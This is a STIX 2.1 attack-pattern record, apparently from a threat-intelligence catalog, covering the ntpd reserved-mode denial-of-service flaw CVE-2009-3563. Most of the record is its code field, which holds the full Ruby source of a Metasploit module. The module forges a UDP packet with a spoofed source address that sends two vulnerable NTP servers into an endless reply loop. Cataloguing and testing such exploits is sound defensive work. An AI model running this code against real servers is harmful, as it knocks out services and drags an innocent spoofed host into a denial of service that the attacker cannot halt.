{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d32706ca-8083-4b53-b0fc-62e325f20ca1",
    "created": "2024-08-14T16:25:01.500506Z",
    "modified": "2024-08-14T16:25:01.50051Z",
    "name": "NTP.org ntpd Reserved Mode Denial of Service",
    "description": " This module exploits a denial of service vulnerability within the NTP (network time protocol) demon. By sending a single packet to a vulnerable ntpd server (Victim A) spoofed from the IP address of another vulnerable ntpd server (Victim B), both victims will enter an infinite response loop. Note, unless you control the spoofed source host or the real remote host(s), you will not be able to halt the DoS condition once begun! ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/ntp/ntpd_reserved_dos.rb",
            "external_id": "ntpd_reserved_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3563"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.ntp.org/show_bug.cgi?id=1331"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NTP.org ntpd Reserved Mode Denial of Service',\n      'Description'    => %q{\n        This module exploits a denial of service vulnerability\n        within the NTP (network time protocol) demon. By sending\n        a single packet to a vulnerable ntpd server (Victim A),\n        spoofed from the IP address of another vulnerable ntpd server\n        (Victim B), both victims will enter an infinite response loop.\n        Note, unless you control the spoofed source host or the real\n        remote host(s), you will not be able to halt the DoS condition\n        once begun!\n      },\n      'Author'         => [ 'todb' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'BID', '37255' ],\n          [ 'CVE', '2009-3563' ],\n          [ 'OSVDB', '60847' ],\n          [ 'URL', 'https://bugs.ntp.org/show_bug.cgi?id=1331' ]\n        ],\n      'DisclosureDate' => '2009-10-04'))\n\n      register_options(\n        [\n          OptAddressLocal.new('LHOST', [true, \"The spoofed address of a vulnerable ntpd server\" ])\n        ])\n      deregister_options('FILTER','PCAPFILE')\n\n  end\n\n  def run_host(ip)\n    open_pcap\n\n    print_status(\"Sending a mode 7 packet to host #{ip} from #{datastore['LHOST']}\")\n\n    p = PacketFu::UDPPacket.new\n    p.ip_saddr = datastore['LHOST']\n    p.ip_daddr = ip\n    p.ip_ttl = 255\n    p.udp_src = 123\n    p.udp_dst = 123\n    p.payload = [\"\\x17\", \"\\x97\\x00\\x00\\x00\"][rand(2)]\n    p.recalc\n    capture_sendto(p,ip)\n\n    close_pcap\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-04"
}